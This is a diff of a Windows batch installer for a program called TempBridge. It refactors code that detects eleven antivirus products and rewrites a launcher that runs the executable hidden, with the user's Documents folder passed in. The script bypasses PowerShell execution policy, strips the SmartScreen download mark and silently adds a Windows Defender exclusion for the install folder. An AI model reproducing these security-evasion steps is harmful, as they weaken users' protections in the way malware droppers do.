@@ -57,70 +57,59 @@ echo Removing downloaded-file mark (SmartScreen)...
 echo [INFO] Adding TempBridge exclusions to all detected antivirus products...
 echo.
 
-:: Call PowerShell script to handle all antivirus exclusions
+:: Call PowerShell script to handle all antivirus exclusions (optimized for speed)
 "%POWERSHELL_PATH%" -NoProfile -ExecutionPolicy Bypass -Command ^
   "$targetExe = '%TARGET_DIR%\\TempBridge.exe'; $targetDir = '%TARGET_DIR%'; " ^
   "$avFound = 0; " ^
   "Write-Host ''; " ^
   "Write-Host '=== Scanning for Antivirus Products ==='; " ^
   "Write-Host ''; " ^
+  "$procs = @{}; Get-Process | ForEach-Object { $procs[$_.ProcessName.ToLower()] = $true }; " ^
   "if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) { " ^
   "  Write-Host '[1/11] Windows Defender:' -NoNewline; " ^
   "  try { Add-MpPreference -ExclusionPath $targetDir -ErrorAction Stop; Write-Host ' ADDED' -ForegroundColor Green; $avFound++ } " ^
   "  catch { Write-Host ' FAILED (may need manual configuration)' -ForegroundColor Yellow } " ^
   "} else { Write-Host '[1/11] Windows Defender: NOT DETECTED' } " ^
   "Write-Host '[2/11] Bitdefender:' -NoNewline; " ^
-  "$bd = Get-Process bdagent,bdservicehost -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($bd) { " ^
-  "  $regPath = 'HKLM:\\SOFTWARE\\Bitdefender\\Bitdefender Agent'; " ^
-  "  if (Test-Path $regPath) { " ^
-  "    try { New-ItemProperty -Path $regPath -Name \"TempBridgeExclusion\" -Value $targetExe -PropertyType String -Force -ErrorAction Stop | Out-Null; Write-Host ' ADDED (Registry)' -ForegroundColor Green; $avFound++ } " ^
-  "    catch { Write-Host ' DETECTED (add manually via GUI)' -ForegroundColor Yellow; $avFound++ } " ^
-  "  } else { Write-Host ' DETECTED (add manually via GUI)' -ForegroundColor Yellow; $avFound++ } " ^
+  "if ($procs['bdagent'] -or $procs['bdservicehost']) { " ^
+  "  Write-Host ' DETECTED (add manually via GUI)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[3/11] Avast:' -NoNewline; " ^
-  "$avast = Get-Process AvastSvc,AvastUI -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($avast) { " ^
+  "if ($procs['avastsvc'] -or $procs['avastui']) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > General > Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[4/11] AVG:' -NoNewline; " ^
-  "$avg = Get-Process AVGSvc,AVGUI -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($avg) { " ^
+  "if ($procs['avgsvc'] -or $procs['avgui']) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > General > Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[5/11] Norton/Symantec:' -NoNewline; " ^
-  "$norton = Get-Process NortonSecurity,ccSvcHst -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($norton) { " ^
+  "if ($procs['nortonsecurity'] -or $procs['ccsvchst']) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > Antivirus > Scans and Risks > Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[6/11] McAfee:' -NoNewline; " ^
-  "$mcafee = Get-Process McShield,McAPExe -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($mcafee) { " ^
+  "if ($procs['mcshield'] -or $procs['mcapexe']) { " ^
   "  Write-Host ' DETECTED (add manually: Virus and Spyware Protection > Excluded Files)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[7/11] Kaspersky:' -NoNewline; " ^
-  "$kaspersky = Get-Process avp,kavfs* -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($kaspersky) { " ^
+  "$kaspFound = $false; $procs.Keys | Where-Object { $_ -like 'avp*' -or $_ -like 'kavfs*' } | ForEach-Object { $kaspFound = $true }; " ^
+  "if ($kaspFound) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > Additional > Threats and Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[8/11] ESET:' -NoNewline; " ^
-  "$eset = Get-Process ekrn,egui -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($eset) { " ^
+  "if ($procs['ekrn'] -or $procs['egui']) { " ^
   "  Write-Host ' DETECTED (add manually: Setup > Computer > Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[9/11] Avira:' -NoNewline; " ^
-  "$avira = Get-Process Avira.* -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($avira) { " ^
+  "$aviraFound = $false; $procs.Keys | Where-Object { $_ -like 'avira*' } | ForEach-Object { $aviraFound = $true }; " ^
+  "if ($aviraFound) { " ^
   "  Write-Host ' DETECTED (add manually: System Scanner > Exceptions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[10/11] Trend Micro:' -NoNewline; " ^
-  "$trend = Get-Process TmListen,PccNTMon -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($trend) { " ^
+  "if ($procs['tmlisten'] -or $procs['pccntmon']) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > Exception List)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host '[11/11] Malwarebytes:' -NoNewline; " ^
-  "$mwb = Get-Process mbam,mbamservice -ErrorAction SilentlyContinue | Select -First 1; " ^
-  "if ($mwb) { " ^
+  "if ($procs['mbam'] -or $procs['mbamservice']) { " ^
   "  Write-Host ' DETECTED (add manually: Settings > Exclusions)' -ForegroundColor Yellow; $avFound++ " ^
   "} else { Write-Host ' NOT DETECTED' } " ^
   "Write-Host ''; " ^
@@ -139,11 +128,34 @@ echo.
 set "DOCS_PATH=%USERPROFILE%\Documents"
 
 echo Writing launcher script to %RUNNER_PS% ...
-"%POWERSHELL_PATH%" -NoProfile -ExecutionPolicy Bypass -Command ^
-  "$docs='%DOCS_PATH%'; $exe='%TARGET_DIR%\TempBridge.exe'; $log='%LOG_FILE%'; $wd='%TARGET_DIR%';" ^
-  "$template = @\"`n$ErrorActionPreference = 'Stop'`n$docs = \"__DOCS__\"`n$exe = \"__EXE__\"`n$log = \"__LOG__\"`n$wd = \"__WD__\"`nfunction Log { param([string]$m) $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; Add-Content -LiteralPath $log -Value \"[$ts] $m\" }`ntry {`n    if (-not (Test-Path -LiteralPath $exe)) { Log \"ERROR missing exe $exe\"; exit 1 }`n    Log \"Start user=$env:USERNAME docs=$docs exe=$exe\"`n    $psi = New-Object System.Diagnostics.ProcessStartInfo`n    $psi.FileName = $exe`n    $psi.WorkingDirectory = $wd`n    $psi.UseShellExecute = $false`n    $psi.CreateNoWindow = $true`n    $psi.WindowStyle = 'Hidden'`n    $psi.Environment['TEMPBRIDGE_DOCUMENTS'] = $docs`n    $p = [System.Diagnostics.Process]::Start($psi)`n    if (-not $p) { Log \"ERROR failed to start process\"; exit 1 }`n    Log \"Started TempBridge pid=$($p.Id)\"`n    exit 0`n} catch {`n    Log (\"ERROR \" + $_.Exception.Message)`n    exit 1`n}`n\"@;" ^
-  "$content = $template.Replace('__DOCS__',$docs).Replace('__EXE__',$exe).Replace('__LOG__',$log).Replace('__WD__',$wd);" ^
-  "Set-Content -LiteralPath '%RUNNER_PS%' -Value $content -Encoding UTF8"
+(
+echo $ErrorActionPreference = 'Stop'
+echo $docs = '%DOCS_PATH%'
+echo $exe = '%TARGET_DIR%\TempBridge.exe'
+echo $log = '%LOG_FILE%'
+echo $wd = '%TARGET_DIR%'
+echo.
+echo function Log { param^([string]$m^) $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; Add-Content -LiteralPath $log -Value "[$ts] $m" }
+echo.
+echo try {
+echo     if ^(-not ^(Test-Path -LiteralPath $exe^)^) { Log "ERROR missing exe $exe"; exit 1 }
+echo     Log "Start user=$env:USERNAME docs=$docs exe=$exe"
+echo     $psi = New-Object System.Diagnostics.ProcessStartInfo
+echo     $psi.FileName = $exe
+echo     $psi.WorkingDirectory = $wd
+echo     $psi.UseShellExecute = $false
+echo     $psi.CreateNoWindow = $true
+echo     $psi.WindowStyle = 'Hidden'
+echo     $psi.Environment['TEMPBRIDGE_DOCUMENTS'] = $docs
+echo     $p = [System.Diagnostics.Process]::Start^($psi^)
+echo     if ^(-not $p^) { Log "ERROR failed to start process"; exit 1 }
+echo     Log "Started TempBridge pid=$^($p.Id^)"
+echo     exit 0
+echo } catch {
+echo     Log ^("ERROR " + $_.Exception.Message^)
+echo     exit 1
+echo }
+) > "%RUNNER_PS%"
 
 if %errorLevel% neq 0 (
     echo [ERROR] Failed to write the launcher script.
